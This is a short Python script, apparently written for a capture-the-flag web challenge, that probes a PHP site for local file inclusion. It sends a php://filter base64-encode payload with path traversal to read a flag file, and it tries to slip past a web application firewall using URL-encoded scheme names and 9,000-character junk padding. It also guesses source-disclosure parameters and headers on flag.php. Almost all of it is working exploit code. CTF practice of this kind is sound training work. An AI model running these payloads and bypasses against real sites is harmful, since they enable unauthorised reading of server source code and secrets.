"""Round 10: WAF decode-check, URI-length bypass, php-source header."""
import re
import urllib.parse
import urllib.request

ROOT = "http://noctf.fa1lsnow.com:40547"
PAYLOAD = "php://filter/convert.base64-encode/resource=woofers/../flag"
JUNK = "A" * 9000


def show(label, url, headers=None):
    req = urllib.request.Request(url, headers=headers or {"User-Agent": "probe"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            st, body = r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        st, body = e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        st, body = "ERR", repr(e)
    note = ""
    if isinstance(body, str):
        m = re.search(r'<div class="page-include">(.*?)</div>', body, re.S)
        if m:
            note = re.sub(r"\s+", " ", m.group(1)).strip()[:700]
        if "Sorry" in body:
            note += " [SORRY]"
        if "PD9waHA" in body or "PD9waHA" in note:
            note += " *** BASE64 PHP FOUND ***"
    print(f"[{st}] {label}\n      {note}\n")
    return body


show("junk=php://filter (control)", f"{ROOT}/index.php?category=woofers&junk=php://filter")
show("junk=%70hp://filter (decode test)", f"{ROOT}/index.php?category=woofers&junk=%70hp://filter")
show("9000 junk BEFORE payload category", f"{ROOT}/index.php?junk={JUNK}&category={urllib.parse.quote(PAYLOAD, safe='')}")
show("payload category FIRST + junk after", f"{ROOT}/index.php?category={urllib.parse.quote(PAYLOAD, safe='')}&junk={JUNK}")
show("junk before woofers/../flag (sanity)", f"{ROOT}/index.php?junk={JUNK}&category=woofers/../flag")
show("Accept php-source on /flag.php", f"{ROOT}/flag.php", headers={"User-Agent": "probe", "Accept": "application/x-httpd-php-source"})
show("/flag.php?read=1", f"{ROOT}/flag.php?read=1")
show("/flag.php?source=1", f"{ROOT}/flag.php?source=1")
show("/flag.php?debug=1", f"{ROOT}/flag.php?debug=1")
